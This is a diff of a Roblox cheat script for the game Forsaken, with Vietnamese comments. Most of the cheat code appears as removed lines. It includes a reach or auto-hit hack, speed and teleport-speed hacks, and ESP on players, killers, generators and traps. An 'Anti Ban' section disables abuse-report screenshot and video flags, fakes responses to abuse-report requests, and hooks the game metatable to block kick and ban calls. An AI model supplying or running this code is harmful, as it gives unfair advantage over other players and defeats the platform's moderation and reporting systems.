-    'rbxassetid://91509234639766',
-    'rbxassetid://105458270463374'
-}
-
--- danh sách model killers và survivors (theo yêu cầu của bạn)
-local Killers = {
-    ["Slasher"] = true, ["1x1x1x1"] = true, ["c00lkidd"] = true,
-    ["Noli"] = true, ["JohnDoe"] = true, ["Guest 666"] = true,
-    ["Sixer"] = true
-}
-
-local Survivors = {
-    ["Noob"] = true, ["Guest1337"] = true, ["Elliot"] = true,
-    ["Shedletsky"] = true, ["TwoTime"] = true, ["007n7"] = true,
-    ["Chance"] = true, ["Builderman"] = true, ["Taph"] = true,
-    ["Dusekkar"] = true, ["Veeronica"] = true
-}
-
--- gom reach logic thành hàm (đã chỉnh để ưu tiên nhắm phe đối nghịch nếu bạn ở dạng model)
-local function ForsakenReachLogic()
-    if not ForsakenReachEnabled or not HumanoidRootPart then
-        return
-    end
-
-    -- kiểm tra animation attack (giữ nguyên)
-    local Playing = false
-    for _,v in Humanoid:GetPlayingAnimationTracks() do
-        if table.find(AttackAnimations, v.Animation.AnimationId) and (v.TimePosition / v.Length < 0.75) then
-            Playing = true
-        end
-    end
-
-    if not Playing then
-        return
-    end
-
-    -- xác định bạn đang là model thuộc phe nào (nếu có)
-    local PlayerRole = nil -- "Killer" | "Survivor" | nil
-    local myModelName = Character and Character.Name
-    if myModelName and Killers[myModelName] then
-        PlayerRole = "Killer"
-    elseif myModelName and Survivors[myModelName] then
-        PlayerRole = "Survivor"
-    end
-
-    local OppositeTable = nil
-    if PlayerRole == "Killer" then
-        OppositeTable = Survivors
-    elseif PlayerRole == "Survivor" then
-        OppositeTable = Killers
-    end
-
-    local Target = nil
-    local CurrentNearestDist = NearestDist
-
-    -- 1) Nếu bạn đang là model (có OppositeTable), ưu tiên tìm mục tiêu thuộc phe đối nghịch trước
-    local OppTarget = nil
-    local OppNearestDist = NearestDist
-
-    local function loopForOpp(t)
-        for _,v in pairs(t) do
-            if v == Character or not v:FindFirstChild("HumanoidRootPart") or not v:FindFirstChild("Humanoid") then
-                continue
-            end
-            local modelName = v.Name
-            if OppositeTable and OppositeTable[modelName] then
-                local Dist = (v.HumanoidRootPart.Position - HumanoidRootPart.Position).Magnitude
-                if Dist < OppNearestDist then
-                    OppNearestDist = Dist
-                    OppTarget = v
-                end
-            end
-        end
-    end
-
-    if OppositeTable then
-        loopForOpp(workspace.Players:GetDescendants())
-        local npcsFolder = workspace.Map:FindFirstChild("NPCs", true)
-        if npcsFolder then
-            loopForOpp(npcsFolder:GetChildren())
-        end
-    end
-
-    -- 2) Nếu không tìm được phe đối nghịch thì fallback về logic gốc nhưng vẫn bỏ qua model cùng phe với bạn
-    local function loopAll(t)
-        for _,v in pairs(t) do
-            if v == Character or not v:FindFirstChild("HumanoidRootPart") or not v:FindFirstChild("Humanoid") then
-                continue
-            end
-            local modelName = v.Name
-            -- bỏ qua cùng phe nếu bạn đang ở dạng model
-            if PlayerRole == "Killer" and Killers[modelName] then
-                continue
-            end
-            if PlayerRole == "Survivor" and Survivors[modelName] then
-                continue
-            end
-            local Dist = (v.HumanoidRootPart.Position - HumanoidRootPart.Position).Magnitude
-            if Dist < CurrentNearestDist then
-                CurrentNearestDist = Dist
-                Target = v
-            end
-        end
-    end
-
-    -- nếu tìm thấy OppTarget thì dùng luôn, không cần tìm tiếp
-    local FinalTarget = nil
-    if OppTarget then
-        FinalTarget = OppTarget
-    else
-        -- fallback: quét players + npcs giống trước nhưng đã loại cùng phe
-        loopAll(workspace.Players:GetDescendants())
-        local npcsFolder2 = workspace.Map:FindFirstChild("NPCs", true)
-        if npcsFolder2 then
-            loopAll(npcsFolder2:GetChildren())
-        end
-        FinalTarget = Target
-    end
-
-    if not FinalTarget then
-        return
-    end
-
-    -- giữ nguyên phần tính velocity + áp dụng hit
-    local OldVelocity = HumanoidRootPart.Velocity
-    local NeededVelocity =
-        (FinalTarget.HumanoidRootPart.Position + Vector3.new(
-            RNG:NextNumber(-1.5, 1.5),
-            0,
-            RNG:NextNumber(-1.5, 1.5)
-        ) + (FinalTarget.HumanoidRootPart.Velocity * (Player:GetNetworkPing() * 1.25))
-            - HumanoidRootPart.Position
-        ) / (Player:GetNetworkPing() * 2)
-
-    HumanoidRootPart.Velocity = NeededVelocity
-    game:GetService('RunService').RenderStepped:Wait()
-    HumanoidRootPart.Velocity = OldVelocity
-end
-
--- vòng lặp auto gọi lại mỗi 0s (giữ nguyên)
-task.spawn(function()
-    while true do
-        task.wait(0)
-        pcall(ForsakenReachLogic)
-    end
-end)
-
-
-
-
-    Tabs.Player:AddSection("Walk Speed")
-
-
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
-local ValueSpeed = 16
-local ActiveSpeedBoost = false
-local speedLoop
-
-local function setSpeed(speed)
-    local character = LocalPlayer.Character
-    if not character then return end
-    local humanoid = character:FindFirstChildOfClass("Humanoid")
-    if humanoid then
-        humanoid.WalkSpeed = speed
-        humanoid:SetAttribute("BaseSpeed", speed)
-    end
-end
-
--- Khi respawn áp dụng lại tốc độ nếu bật
-LocalPlayer.CharacterAdded:Connect(function()
-    task.wait(0.1)
-    if ActiveSpeedBoost then
-        setSpeed(ValueSpeed)
-    end
-end)
-
--- Slider chỉnh tốc độ
-Tabs.Player:AddSlider("PlayerSpeedSlider", {
-    Title = "Set Speed",
-    Min = 0,
-    Max = 40,
-    Default = ValueSpeed,
-    Rounding = 1,
-}):OnChanged(function(value)
-    ValueSpeed = value
-    if ActiveSpeedBoost then
-        setSpeed(ValueSpeed)
-    end
-end)
-
--- Toggle bật/tắt tốc độ và loop tăng tốc liên tục
-Tabs.Player:AddToggle("PlayerSpeedToggle", {
-    Title = "Walk Speed",
-    Default = false,
-}):OnChanged(function(value)
-    ActiveSpeedBoost = value
-    if value then
-        setSpeed(ValueSpeed)
-        -- Bắt đầu vòng lặp liên tục set tốc độ mỗi 0.5 giây
-        speedLoop = task.spawn(function()
-            while ActiveSpeedBoost do
-                setSpeed(ValueSpeed)
-                task.wait(0.5)
-            end
-        end)
-    else
-        -- Tắt vòng lặp và reset tốc độ về mặc định 16
-        if speedLoop then
-            speedLoop = nil
-        end
-        setSpeed(16)
-    end
-end)
-
-
-
-    Tabs.Player:AddSection("Teleport Speed")
-
-
--- === Teleport Speed Setup ===
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-
-local LocalPlayer = Players.LocalPlayer
-local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-local Humanoid = Character:WaitForChild("Humanoid")
-local HRP = Character:WaitForChild("HumanoidRootPart")
-
-local defaultSpeed = 50
-local maxSpeed = 300
-local currentSpeed = defaultSpeed
-local teleportSpeedEnabled = false
-
--- Cập nhật lại khi respawn
-LocalPlayer.CharacterAdded:Connect(function(char)
-    Character = char
-    Humanoid = Character:WaitForChild("Humanoid")
-    HRP = Character:WaitForChild("HumanoidRootPart")
-end)
-
--- Loop để dịch chuyển (teleport speed)
-RunService.Heartbeat:Connect(function(dt)
-    if teleportSpeedEnabled and Humanoid and HRP then
-        if Humanoid.MoveDirection.Magnitude > 0 then
-            local moveDir = Humanoid.MoveDirection.Unit
-            HRP.CFrame = HRP.CFrame + (moveDir * (currentSpeed * dt))
-        end
-    end
-end)
-
--- === GUI Bindings ===
--- Slider Teleport Speed
-Tabs.Player:AddSlider("TeleportSpeedSlider", {
-    Title = "Set Speed",
-    Min = 1,
-    Max = maxSpeed,
-    Default = defaultSpeed,
-    Rounding = 1,
-}):OnChanged(function(value)
-    currentSpeed = value
-end)
-
--- Toggle bật/tắt Teleport Speed
-Tabs.Player:AddToggle("TeleportSpeedToggle", {
-    Title = "Teleport Speed",
-    Default = false,
-}):OnChanged(function(enabled)
-    teleportSpeedEnabled = enabled
-end)
-
-     
-
--- Tabs.Visual
-
---// ⚙️ ESP Loại: Clone, Player, Survivors, Killers, Generator, Items, Buildman
---// Tất cả đều dùng chung ESPManager (đã định nghĩa ở trên)
-
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
------------------------------------------------------
--- 🟢 1. CLONE ESP
------------------------------------------------------
-local allowedModelsClone = {
-    ["1x1x1x1Zombie"] = true,
-    ["PizzaDeliveryRig"] = true,
-    ["Mafia1"] = true,
-    ["Mafia2"] = true,
-    ["Mafia3"] = true,
-    ["Mafia4"] = true,
-}
-
-_G.ESPManager:RegisterType("Clone", Color3.fromRGB(0, 255, 0), function(obj)
-    return obj:IsA("Model") and allowedModelsClone[obj.Name]
-end, false)
-
-Tabs.Visual:AddToggle("ESPCloneToggle", {
-    Title = "ESP Clone",
-    Default = false,
-}):OnChanged(function(state)
-    _G.ESPManager:SetEnabled("Clone", state)
-end)
-
-
-
-    Tabs.Visual:AddSection("Player")
-
-_G.ESPManager:RegisterType("Player", Color3.fromRGB(0, 255, 255), function(obj)
-    local plr = Players:GetPlayerFromCharacter(obj)
-    return plr and plr ~= LocalPlayer
-end, false)
-
-Tabs.Visual:AddToggle("ESPPlayerToggle", {
-    Title = "ESP Player",
-    Default = false,
-}):OnChanged(function(state)
-    _G.ESPManager:SetEnabled("Player", state)
-end)
-
-
-local survivorsFolder = workspace:WaitForChild("Players"):WaitForChild("Survivors")
-_G.ESPManager:RegisterType("Survivor", Color3.fromRGB(255, 255, 255), function(obj)
-    return obj:IsA("Model") and obj.Parent == survivorsFolder and obj:FindFirstChildOfClass("Humanoid")
-end, true)
-
-Tabs.Visual:AddToggle("ESPModelWhiteToggle", {
-    Title = "ESP Survivors",
-    Default = false,
-}):OnChanged(function(state)
-    _G.ESPManager:SetEnabled("Survivor", state)
-end)
-
-
-
-local killersFolder = workspace:WaitForChild("Players"):WaitForChild("Killers")
-
-_G.ESPManager:RegisterType("Killer", Color3.fromRGB(255, 0, 0), function(obj)
-    if not (obj:IsA("Model") and obj.Parent == killersFolder) then
-        return false
-    end
-
-    -- Phải có Humanoid
-    if not obj:FindFirstChildOfClass("Humanoid") then
-        return false
-    end
-
-    local name = obj.Name
-
-    -- Chỉ ESP Noli thật (tên đúng 100% = "Noli")
-    if name == "Noli" then
-        return true
-    end
-
-    -- ESP các killer khác
-    local Killers = {
-        ["Slasher"] = true,
-        ["1x1x1x1"] = true,
-        ["c00lkidd"] = true,
-        ["JohnDoe"] = true,
-        ["Guest 666"] = true,
-        ["Sixer"] = true
-    }
-
-    -- Không cho tên chứa "noli" mà không phải Noli thật
-    local lower = string.lower(name)
-    if lower:find("noli") and name ~= "Noli" then
-        return false
-    end
-
-    return Killers[name] == true
-end, true)
-
-
-Tabs.Visual:AddToggle("ESPModelRedToggle", {
-    Title = "ESP Killers",
-    Default = false,
-}):OnChanged(function(state)
-    _G.ESPManager:SetEnabled("Killer", state)
-end)
-
-
------------------------------------------------------
--- ⚙️ 5. GENERATOR ESP
------------------------------------------------------
-
-    Tabs.Visual:AddSection("Other")
-
-_G.ESPManager:RegisterType("Generator", Color3.fromRGB(255,255,255), function(obj)
-    if not (obj and obj:IsA("Model") and obj.Name == "Generator") then
-        return false
-    end
-
-    local progress = obj:FindFirstChild("Progress", true)
-    if not progress or not progress:IsA("NumberValue") then
-        return false
-    end
-
-    -- Gắn kết một lần để theo dõi khi Progress.Value thay đổi
-    if not progress:GetAttribute("ESP_Watch") then
-        progress:SetAttribute("ESP_Watch", true)
-        progress:GetPropertyChangedSignal("Value"):Connect(function()
-            -- Nếu đạt 100% thì remove ESP ngay
-            if progress.Value >= 100 then
-                _G.ESPManager:Remove(obj)
-            else
-                -- Nếu ESP chưa có, tạo lại
-                if not _G.ESPManager.Objects[obj] then
-                    _G.ESPManager:_ScheduleCreate(obj, "Generator")
-                end
-            end
-        end)
-    end
-
-    -- Chỉ hiển thị khi chưa hoàn thành
-    return progress.Value < 100
-end, false)
-
-Tabs.Visual:AddToggle("ESPGeneratorToggle", {
-    Title = "ESP Generator",
-    Default = false,
-}):OnChanged(function(state)
-    _G.ESPManager:SetEnabled("Generator", state)
-end)
-
-
------------------------------------------------------
--- 🟡 6. ITEMS ESP
------------------------------------------------------
-_G.ESPManager:RegisterType("Item", Color3.fromRGB(255,215,0), function(obj)
-    return obj:IsA("Tool") and obj.Parent and obj:IsDescendantOf(workspace:FindFirstChild("Map"))
-end, false)
-
-Tabs.Visual:AddToggle("ESPItemsToggle", {
-    Title = "ESP Items",
-    Default = false,
-}):OnChanged(function(state)
-    _G.ESPManager:SetEnabled("Item", state)
-end)
-
-
------------------------------------------------------
--- 🟣 7. BUILDMAN ESP
------------------------------------------------------
-_G.ESPManager:RegisterType("Dispenser", Color3.fromRGB(0, 162, 255), function(obj)
-    return obj:IsA("Model") and obj.Name:lower():find("dispenser")
-end, false)
-
-_G.ESPManager:RegisterType("Sentry", Color3.fromRGB(128, 128, 128), function(obj)
-    return obj:IsA("Model") and obj.Name:lower():find("sentry")
-end, false)
-
-_G.ESPManager:RegisterType("Tripwire", Color3.fromRGB(255, 85, 0), function(obj)
-    return obj:IsA("Model") and obj.Name:find("TaphTripwire")
-end, false)
-
-_G.ESPManager:RegisterType("Subspace", Color3.fromRGB(160, 32, 240), function(obj)
-    return obj:IsA("Model") and obj.Name == "SubspaceTripmine"
-end, false)
-
-Tabs.Visual:AddSection("Buildman")
-
-Tabs.Visual:AddToggle("DispenserESP_Toggle", {
-    Title = "ESP Dispenser",
-    Default = false,
-}):OnChanged(function(state)
-    _G.ESPManager:SetEnabled("Dispenser", state)
-end)
-
-Tabs.Visual:AddToggle("SentryESP_Toggle", {
-    Title = "ESP Sentry",
-    Default = false,
-}):OnChanged(function(state)
-    _G.ESPManager:SetEnabled("Sentry", state)
-end)
-
-Tabs.Visual:AddSection("Tapt/Trap")
-
-Tabs.Visual:AddToggle("TripwireESP_Toggle", {
-    Title = "ESP Trip Wire",
-    Default = false,
-}):OnChanged(function(state)
-    _G.ESPManager:SetEnabled("Tripwire", state)
-end)
-
-Tabs.Visual:AddToggle("SubspaceESP_Toggle", {
-    Title = "ESP Bomb Trap",
-    Default = false,
-}):OnChanged(function(state)
-    _G.ESPManager:SetEnabled("Subspace", state)
-end)
-
--- Tabs.Misc
-
-
-
-
-local Lighting = game:GetService("Lighting")
-local RunService = game:GetService("RunService")
-
--- ✅ FullBright Settings
-local fullBrightEnabled = false
-local fullBrightLoop
-
-local function applyFullBright()
-    if not fullBrightEnabled then return end
-
-    Lighting.Ambient = Color3.fromRGB(200, 200, 200) -- sáng nhẹ
-    Lighting.Brightness = 4 -- giảm độ sáng từ 10 → 4
-    Lighting.GlobalShadows = false
-end
-
-local function enableFullBright()
-    if fullBrightLoop then fullBrightLoop:Disconnect() end
-    applyFullBright()
-    fullBrightLoop = Lighting:GetPropertyChangedSignal("ClockTime"):Connect(applyFullBright)
-end
-
-local function disableFullBright()
-    if fullBrightLoop then
-        fullBrightLoop:Disconnect()
-        fullBrightLoop = nil
-    end
-
-    Lighting.Ambient = Color3.fromRGB(128, 128, 128)
-    Lighting.Brightness = 1
-    Lighting.GlobalShadows = true
-end
-
--- ✅ Toggle: FullBright
-local FbToggle = Tabs.Misc:AddToggle("FbToggle", {
-    Title = "Auto Full Bright",
-    Default = false
-})
-FbToggle:OnChanged(function(Value)
-    fullBrightEnabled = Value
-    if fullBrightEnabled then
-        enableFullBright()
-    else
-        disableFullBright()
-    end
-end)
-
--- ✅ Remove Fog Settings
-local fogEnabled = false
-local fogLoop
-
-local function removeFog()
-    Lighting.FogStart = 0
-    Lighting.FogEnd = 1000000
-
-    local atmosphere = Lighting:FindFirstChild("Atmosphere")
-    if atmosphere then
-        atmosphere.Density = 0
-        atmosphere.Offset = 0
-        atmosphere.Haze = 0
-        atmosphere.Color = Color3.new(1, 1, 1)
-    end
-end
-
-local function restoreFog()
-    Lighting.FogStart = 200
-    Lighting.FogEnd = 1000
-
-    local atmosphere = Lighting:FindFirstChild("Atmosphere")
-    if atmosphere then
-        atmosphere.Density = 0.3
-        atmosphere.Offset = 0
-        atmosphere.Haze = 0.5
-        atmosphere.Color = Color3.fromRGB(200, 200, 200)
-    end
-end
-
--- ✅ Toggle: Remove Fog
-local FogToggle = Tabs.Misc:AddToggle("FogToggle", {
-    Title = "Remove Fog",
-    Default = false
-})
-FogToggle:OnChanged(function(Value)
-    fogEnabled = Value
-    if fogEnabled then
-        removeFog()
-        fogLoop = RunService.Heartbeat:Connect(removeFog)
-    else
-        if fogLoop then fogLoop:Disconnect() fogLoop = nil end
-        restoreFog()
-    end
-end)
-
-
-
-local Lighting = game:GetService("Lighting")
-local Players = game:GetService("Players")
-local LP = Players.LocalPlayer
-local PlayerGui = LP:WaitForChild("PlayerGui")
-
--- Flag bật/tắt
-local ActiveRemoveAll = false
-
--- Danh sách tên hiệu ứng thường gặp
-local effectNames = {
-    "BlurEffect", "ColorCorrectionEffect", "BloomEffect", "SunRaysEffect", 
-    "DepthOfFieldEffect", "ScreenFlash", "HitEffect", "DamageOverlay", 
-    "BloodEffect", "Vignette", "BlackScreen", "WhiteScreen", "ShockEffect",
-    "Darkness", "JumpScare", "LowHealthOverlay", "Flashbang", "FadeEffect"
-}
-
--- Danh sách class hiệu ứng trong Lighting
-local effectClasses = {
-    "BlurEffect",
-    "BloomEffect",
-    "SunRaysEffect",
-    "DepthOfFieldEffect",
-    "ColorCorrectionEffect"
-}
-
--- 🌟 Hàm xoá tất cả (effects + popups)
-local function removeAll()
-    -- Xoá hiệu ứng trong Lighting
-    for _, obj in pairs(Lighting:GetDescendants()) do
-        if table.find(effectNames, obj.Name) or table.find(effectClasses, obj.ClassName) then
-            obj:Destroy()
-        end
-    end
-
-    -- Xoá GUI overlay
-    for _, obj in pairs(PlayerGui:GetDescendants()) do
-        if table.find(effectNames, obj.Name) then
-            obj:Destroy()
-        elseif obj:IsA("ScreenGui") or obj:IsA("BillboardGui") or obj:IsA("SurfaceGui") then
-            if obj:FindFirstChildWhichIsA("ImageLabel") or obj:FindFirstChildWhichIsA("Frame") then
-                if table.find(effectNames, obj.Name) or obj.Name:lower():find("overlay") or obj.Name:lower():find("effect") then
-                    obj:Destroy()
-                end
-            end
-        end
-    end
-
-    -- Xoá popup 1x1x1x1
-    local temp = PlayerGui:FindFirstChild("TemporaryUI")
-    if temp then
-        local popup = temp:FindFirstChild("1x1x1x1Popup")
-        if popup then
-            popup:Destroy()
-        end
-    end
-end
-
--- Toggle Fluent - chỉ 1 cái
-Tabs.Misc:AddToggle("RemoveAllBadStuff", {
-    Title = "Remove Effects V2",
-    Default = true,
-    Callback = function(state)
-        ActiveRemoveAll = state
-        if state then
-            task.spawn(function()
-                while ActiveRemoveAll do
-                    removeAll()
-                    task.wait(0.5)
-                end
-            end)
-        end
-    end
-})
-
-
-
-    Tabs.Misc:AddSection("Server")
-
-
-------------------------------------------------------------
--- ⚡ SERVER HOP (Mobile-friendly + Fluent Button)
-------------------------------------------------------------
-
-local TeleportService = game:GetService("TeleportService")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
--- 🌀 Hàm thực hiện teleport sang server mới
-local function ServerHop()
-    local placeId = game.PlaceId
-    local jobId = game.JobId
-
-    -- pcall để tránh lỗi Teleport crash
-    local success, err = pcall(function()
-        TeleportService:Teleport(placeId, LocalPlayer)
-    end)
-
-    if success then
-        if Fluent and Fluent.Notify then
-            Fluent:Notify({
-                Title = "Rejoin Starting",
-                Content = "Bắt Đầu Vào Máy Chủ Đã Fix Lag",
-                Duration = 3
-            })
-        else
-        end
-    else
-        if Fluent and Fluent.Notify then
-            Fluent:Notify({
-                Title = "Lỗi Teleport",
-                Content = tostring(err),
-                Duration = 4
-            })
-        end
-    end
-end
-
-
-------------------------------------------------------------
--- 🧩 THÊM NÚT TRONG FLUENT UI
-------------------------------------------------------------
-
--- Giả sử bạn có tab Dev sẵn, tương tự ví dụ của bạn:
--- Tabs.Dev:AddButton(...)
-
-Tabs.Misc:AddButton({
-    Title = "Rejoin To Fix Lag",
-    Description = "Tham Gia Lại Máy Chủ Để Giảm Lag",
-    Callback = function()
-        -- Hiện thông báo chuẩn bị
-        if Fluent and Fluent.Notify then
-            Fluent:Notify({
-                Title = "Rejoin Settings",
-                Content = "Đang Giảm Lag Cho Các Máy Chủ...",
-                Duration = 2
-            })
-        end
-
-        task.wait(0.3)
-        ServerHop()
-    end
-})
-
-
-
--- 🌐 Server Hop Button
-Tabs.Misc:AddButton({
-    Title = "Server Hop To Low Player",
-    Description = "Dùng Để Đổi Server Có Thể Vào Server Ít Player",
-    Callback = function()
-        local PlaceID = game.PlaceId
-        local AllIDs = {}
-        local foundAnything = ""
-        local actualHour = os.date("!*t").hour
-
-        -- Đọc file nếu có
-        local File = pcall(function()
-            AllIDs = game:GetService("HttpService"):JSONDecode(readfile("NotSameServers.json"))
-        end)
-
-        if not File then
-            table.insert(AllIDs, actualHour)
-            writefile("NotSameServers.json", game:GetService("HttpService"):JSONEncode(AllIDs))
-        end
-
-        local function TPReturner()
-            local Site
-            if foundAnything == "" then
-                Site = game.HttpService:JSONDecode(game:HttpGet(
-                    "https://games.roblox.com/v1/games/" .. PlaceID .. "/servers/Public?sortOrder=Asc&limit=100"
-                ))
-            else
-                Site = game.HttpService:JSONDecode(game:HttpGet(
-                    "https://games.roblox.com/v1/games/" .. PlaceID .. "/servers/Public?sortOrder=Asc&limit=100&cursor=" .. foundAnything
-                ))
-            end
-
-            if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
-                foundAnything = Site.nextPageCursor
-            end
-
-            local num = 0
-            for _, v in pairs(Site.data) do
-                local Possible, ID = true, tostring(v.id)
-                if tonumber(v.maxPlayers) > tonumber(v.playing) then
-                    for _, Existing in pairs(AllIDs) do
-                        if num ~= 0 then
-                            if ID == tostring(Existing) then
-                                Possible = false
-                            end
-                        else
-                            if tonumber(actualHour) ~= tonumber(Existing) then
-                                pcall(function()
-                                    delfile("NotSameServers.json")
-                                    AllIDs = {}
-                                    table.insert(AllIDs, actualHour)
-                                end)
-                            end
-                        end
-                        num = num + 1
-                    end
-                    if Possible then
-                        table.insert(AllIDs, ID)
-                        pcall(function()
-                            writefile("NotSameServers.json", game:GetService("HttpService"):JSONEncode(AllIDs))
-                            game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
-                        end)
-                        task.wait(4)
-                    end
-                end
-            end
-        end
-
-        local function Teleport()
-            while task.wait() do
-                pcall(function()
-                    TPReturner()
-                    if foundAnything ~= "" then
-                        TPReturner()
-                    end
-                end)
-            end
-        end
-
-        -- Gọi để bắt đầu Server Hop
-        Teleport()
-    end
-})
-
-
-
-
-    Tabs.Misc:AddSection("Bypass")
-
-local antiAFKCons = {}
-
--- Chỉ tạo toggle nếu executor có getconnections
-if getconnections then
-    Tabs.Misc:AddToggle("AntiAFK", {
-        Title = "Anti-AFK",
-        Default = true
-    }):OnChanged(function(state)
-        local idleCons = getconnections(game.Players.LocalPlayer.Idled)
-        
-        if state then
-            -- Lưu & disable
-            for _, c in ipairs(idleCons) do
-                antiAFKCons[c] = true
-                c:Disable()
-            end
-        else
-            -- Enable lại
-            for c,_ in pairs(antiAFKCons) do
-                if c and c.Enable then
-                    pcall(function() c:Enable() end)
-                end
-            end
-            antiAFKCons = {}
-        end
-    end)
+if getgenv then
+	getgenv().DoriHub = Library
 else
+	DoriHub = Library
 end
 
-
-
-
-
-
-do
-    local Players = game:GetService("Players")
-    local LocalPlayer = Players.LocalPlayer
-    local LocalizationService = game:GetService("LocalizationService")
-
-    shared.AntiBanSafe = shared.AntiBanSafe or {running = false, hooks = {}}
-    local data = shared.AntiBanSafe
-
-    local oldNamecall, oldIndex
-    local protectionThread
-
-    local function safe(func, ...)
-        local ok, res = pcall(func, ...)
-        if ok then return res end
-    end
-
-    -- Disable screenshot/video flags khi bật protection
-    local function disableReportFlags()
-        if typeof(setfflag) == "function" then
-            pcall(function()
-                setfflag("AbuseReportScreenshot", "False")
-                setfflag("AbuseReportScreenshotPercentage", "0") -- chỉnh về 0
-                setfflag("AbuseReportEnabled", "False")
-                setfflag("ReportAbuseMenu", "False")
-                setfflag("EnableAbuseReportScreenshot", "False")
-                setfflag("AbuseReportVideo", "False")
-                setfflag("AbuseReportVideoPercentage", "0")
-                setfflag("VideoCaptureEnabled", "False")
-                setfflag("RecordVideo", "False")
-            end)
-        end
-    end
-
-    -- Restore flag về bình thường khi tắt protection
-    local function setFlagsOn()
-        if typeof(setfflag) == "function" then
-            pcall(function()
-                setfflag("AbuseReportScreenshot", "True")
-                setfflag("AbuseReportScreenshotPercentage", "100")
-            end)
-        end
-    end
-
-    -- Hook requests (block report)
-    local function hookRequests()
-        if data.hooks.requestHooked then return end
-        local oldRequest = (syn and syn.request) or request or http_request
-        if typeof(oldRequest) == "function" and typeof(hookfunction) == "function" then
-            hookfunction(oldRequest, function(req)
-                if req and req.Url and tostring(req.Url):lower():find("abuse") then
-                    return {StatusCode = 200, Body = "Blocked"}
-                end
-                return oldRequest(req)
-            end)
-            data.hooks.requestHooked = true
-        end
-    end
-
-    -- Hook FindFirstChild (block GUI video/screenshot)
-    local function hookFindFirstChild()
-        if data.hooks.findHooked then return end
-        local oldFind = workspace.FindFirstChild
-        if typeof(oldFind) == "function" and typeof(hookfunction) == "function" then
-            hookfunction(oldFind, function(self, name, ...)
-                if name and tostring(name):lower():find("screenshot") then return nil end
-                if name and tostring(name):lower():find("video") then return nil end
-                return oldFind(self, name, ...)
-            end)
-            data.hooks.findHooked = true
-        end
-    end
-
-    -- Safe bypass (__namecall)
-    local function safeBypass()
-        if getrawmetatable and hookmetamethod and newcclosure then
-            local mt = getrawmetatable(game)
-            setreadonly(mt, false)
-            oldNamecall = oldNamecall or mt.__namecall
-            oldIndex = oldIndex or mt.__index
-
-            mt.__namecall = newcclosure(function(self, ...)
-                local method = getnamecallmethod()
-                local args = {...}
-
-                -- Block LocalPlayer kick/ban
-                if (method == "Kick" or method == "Ban") and self == LocalPlayer then return nil end
-
-                -- Block remote kick/ban
-                if (method == "FireServer" or method == "InvokeServer") and args[1] then
-                    local msg = tostring(args[1]):lower()
-                    if msg:find("kick") or msg:find("ban") then return nil end
-                end
-
-                -- Block LocalizationService
-                if self == LocalizationService and method == "GetCountryRegionForPlayerAsync" then
-                    local success, result = pcall(function()
-                        return LocalizationService:GetCountryRegionForPlayerAsync(LocalPlayer)
-                    end)
-                    if success then return result else return "US" end
-                end
-
-                return oldNamecall(self, ...)
-            end)
-
-            mt.__index = newcclosure(function(t, k)
-                local key = tostring(k):lower()
-                if key:find("kick") or key:find("ban") then return function() return nil end end
-                return oldIndex(t, k)
-            end)
-
-            setreadonly(mt, true)
-        end
-    end
-
-    -- Restore hooks
-    local function restoreHooks()
-        if getrawmetatable then
-            local mt = getrawmetatable(game)
-            setreadonly(mt, false)
-            if oldNamecall then mt.__namecall = oldNamecall end
-            if oldIndex then mt.__index = oldIndex end
-            setreadonly(mt, true)
-            oldNamecall, oldIndex = nil, nil
-        end
-    end
-
-    -- Start protection
-    local function startAntiBanSafe()
-        if data.running then return end
-        data.running = true
-
-        safe(hookRequests)
-        safe(hookFindFirstChild)
-        safe(safeBypass)
-
-        -- Disable screenshot/video
-        protectionThread = task.spawn(function()
-            while data.running do
-                safe(disableReportFlags)
-                task.wait(0.2)
-            end
-        end)
-
-    end
-
-    -- Stop protection
-    local function stopAntiBanSafe()
-        data.running = false
-        protectionThread = nil
-        restoreHooks()
-        setFlagsOn() -- phục hồi flag về bình thường
-    end
-
-    -- Toggle
-    Tabs.Misc:AddToggle("AntiBanV3", {
-        Title = "Anti Ban V3.5",
-        Default = true,
-        Callback = function(state)
-            if state then
-                startAntiBanSafe()
-            else
-                stopAntiBanSafe()
-            end
-        end
-    })
-end
-
-
-
-
-
-
-do
--- === SafeGenTeleport (Anti: ALL Moving Models/Parts/Effects) ===
-local Players = game:GetService("Players")
-local LP = Players.LocalPlayer
-
-local SafeGenRunning = false
-local SafeGenThread
-local DetectRadius = 20 -- mặc định 20, có thể chỉnh bằng ô input
-
--- Danh sách account thật dùng V2
-local AllowedPlayers = {
-    ["Hu1a0_Hu9"] = true,
-    ["hdksakst"] = true
-}
-
--- Danh sách Killers
-local DangerousKillers = {
-    Slasher = true, ["1x1x1x1"] = true, c00lkidd = true,
-    Noli = true, JohnDoe = true, ["Guest 666"] = true,
-    PizzaDeliveryRig = true, Mafia1 = true, Mafia2 = true,
-    ["1x1x1x1Zombie"] = true, ["Sixer"] = true
-}
-
--- Danh sách Clones (coi như Killers)
-local DangerousClones = {
-    PizzaDeliveryRig = true, Mafia1 = true, Mafia2 = true,
-    ["1x1x1x1Zombie"] = true
-}
-
--- Danh sách Survivors (bạn có thể biến thành)
-local Survivors = {
-    Noob = true, Guest1337 = true, Elliot = true, Shedletsky = true,
-    TwoTime = true, ["007n7"] = true, Chance = true,
-    Builderman = true, Taph = true, Dusekkar = true
-}
-
--- Whitelist
-local SafeObjects = {Pet=true, Decoration=true, Terrain=true, Map=true}
-
--- Cấu hình detect
-local MOVE_THRESHOLD = 0.5
-local VEL_THRESHOLD  = 1
-local SCAN_DELAY     = 0.12
-
-local lastPositions = {}
-
-local function findOwningCharacter(inst)
-    local cur = inst
-    while cur and cur ~= workspace and cur.Parent do
-        if cur:IsA("Model") then
-            local p = Players:GetPlayerFromCharacter(cur)
-            if p then return cur, p end
-        end
-        cur = cur.Parent
-    end
-    return nil, nil
-end
-
-local function hasForceOnPart(part)
-    if not part then return false end
-    if part:FindFirstChildOfClass("BodyVelocity")
-    or part:FindFirstChildOfClass("BodyPosition")
-    or part:FindFirstChildOfClass("BodyForce")
-    or part:FindFirstChildOfClass("BodyGyro")
-    or part:FindFirstChildOfClass("LinearVelocity")
-    or part:FindFirstChildOfClass("VectorForce")
-    or part:FindFirstChildOfClass("AlignPosition")
